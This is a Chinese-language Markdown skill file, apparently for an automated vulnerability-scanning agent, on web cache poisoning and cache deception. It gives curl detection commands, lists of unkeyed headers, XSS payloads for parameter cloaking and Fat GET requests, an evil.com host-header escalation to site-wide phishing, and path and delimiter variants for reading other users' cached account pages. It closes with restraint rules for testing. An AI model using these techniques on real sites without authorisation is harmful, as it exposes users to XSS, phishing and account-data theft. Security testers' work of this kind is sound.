---
name: hunt-cache-poison
description: Web 缓存投毒与缓存欺骗：未键入头识别（X-Forwarded-Host/X-Host/Forwarded）、参数伪装与 Fat GET、缓存欺骗（静态扩展名绕过鉴权）、分隔符混淆、CDN 回源差异利用
whenToUse: 目标前置 CDN/缓存层（响应含 X-Cache/Age/Via/CF-Cache-Status），或发现「同一 URL 对不同用户返回不同内容」时
role: vuln-scan
enabled: true
---

# 缓存投毒 / 缓存欺骗

## 1. 判定前提：先确认有缓存层

看响应头：

```
X-Cache: HIT / MISS          Age: 123          Via: 1.1 varnish
CF-Cache-Status: HIT         X-Cache-Status: HIT
Server-Timing: cdn-cache;desc=HIT
```

无上述头则可能无独立缓存层，本技能不适用（但仍有应用层缓存，可看 `Set-Cookie` 是否被缓存）。

## 2. 缓存投毒（Cache Poisoning）

**原理**：缓存键只含 URL（不含某些头/参数），但响应内容受这些头/参数影响 → 投毒一次，所有后续用户拿到恶意响应。

### 2.1 未键入头（unkeyed header）识别

常见未被键入但被回显/影响响应的头：

```
X-Forwarded-Host      X-Forwarded-Scheme     X-Forwarded-Proto
X-Host                X-Original-URL         X-Rewrite-URL
X-HTTP-Method-Override                       X-Forwarded-Port
Forwarded             X-Backend-Server       X-Wap-Profile
```

**检测法**：同一 URL 发两次，第二次加头，对比响应体差异 + 两次 `X-Cache` 是否同为 HIT。

```bash
curl -s -D- "https://TARGET/page" -o /tmp/a
curl -s -D- "https://TARGET/page" -H "X-Forwarded-Host: OAST" -o /tmp/b
diff /tmp/a /tmp/b
```

响应里出现 `OAST` 且缓存命中 = **未键入头确认**。

### 2.2 投毒步骤

1. 发送带恶意头的请求**直到缓存命中**（多次发，或先让缓存过期）。
2. 换一个干净会话访问同一 URL。
3. 如果收到带攻击者内容的响应 = 投毒成立。

**危害升链**：`X-Forwarded-Host: evil.com` 投毒 → 页面里所有相对 URL 指向攻击者域 → 接管 JS/CSS/表单提交 → 全站用户被钓鱼。

### 2.3 参数伪装（Parameter Cloaking）

UTM 等参数常不在缓存键里：

```
?utm_content=<script>alert(1)</script>
?callback=alert(1)
?_=1&xss=<script>
```

如果响应回显了未键入参数 = 可投 XSS 到缓存。

### 2.4 Fat GET

GET 请求带 body，部分缓存只看 URL 不读 body，但后端读了：

```http
GET /page HTTP/1.1
Host: TARGET
Content-Length: 25

x=<script>alert(1)</script>
```

### 2.5 HTTP/2 专属头

```
:path 覆盖、:authority 与 Host 不一致
```

## 3. 缓存欺骗（Cache Deception）

**原理**：后端把 `/account/profile.css` 当成 `/account` 处理（忽略不存在的路径段），但缓存层看到 `.css` 认为是静态资源并缓存 → 攻击者让受害者访问该 URL，之后任何人都能读到受害者的 `/account` 响应。

### 3.1 检测

```bash
# 1. 确认动态页不缓存
curl -s -D- "https://TARGET/account" | grep -i "cache-control"

# 2. 加静态扩展名，看是否被缓存
curl -s -D- "https://TARGET/account/profile.css" | grep -i "x-cache\|age"

# 3. 第二次请求看 Age 是否递增
```

### 3.2 路径变体

```
/account/profile.css
/account/profile.js
/account/profile.jpg
/account/profile.css?x=1
/account;.css
/account/..%2fprofile.css
/account%00.css
/account;%00.css
```

### 3.3 分隔符混淆

不同组件对路径分隔符理解不同：

```
/account%2fprofile.css        %2f
/account%3bprofile.css        %3b (;)
/account%23profile.css        %23 (#)
/account%3fprofile.css        %3f (?)
/account/.;/profile.css
/account/..;/profile.css
```

**判定**：后端返回 `/account` 的内容（200 + 用户数据），缓存层 `X-Cache: HIT` 且无 `Cache-Control: private` = **成立**。

## 4. 回源差异（Origin Leak）

| 手法 | 说明 |
|---|---|
| `Host` 与 `X-Forwarded-Host` 不一致 | 后端按 XFH 生成绝对 URL |
| 大小写 Host（`Example.COM`） | 回源到不同 vhost |
| Host 带端口/尾点（`target.com.:443`） | 绕过回源白名单 |
| `X-Original-URL: /admin` | 部分框架按此路由 |

## 5. 判定与产出

| 现象 | 定性 |
|---|---|
| 投毒后已登录用户收到攻击者内容 | **P0（全站 XSS/钓鱼）** |
| 缓存欺骗读到他人账户响应 | **P0（越权）** |
| 仅未键入头回显，无跨用户影响 | P3（信息泄露） |
| 有 `Vary` 覆盖所有相关头 | 不成立 |

- 落库 `category=other`（或 `xss` 若投 XSS）。
- **取证纪律**：投毒验证只用无害标记字符串（如 `POISON_TEST_abc123`），绝不投真实 XSS payload 到生产缓存。

## 6. 不要做的事

- 禁：向真实生产缓存投放可执行 JS/钓鱼内容。
- 禁：让真实用户看到被投毒的响应（投毒后立刻用 `PURGE` 或等 TTL 过期）。
- 禁：缓存欺骗读取真实他人账户数据（自己两个账号互验即可）。
- 禁：对 CDN 做大量 PURGE 请求（可能触发限流/计费）。

<!-- 改编自: src-hunter references/playbooks/ssrf-cache-host/12-cache.md + PayloadsAllTheThings/Web Cache Deception, 2026-11-01 -->
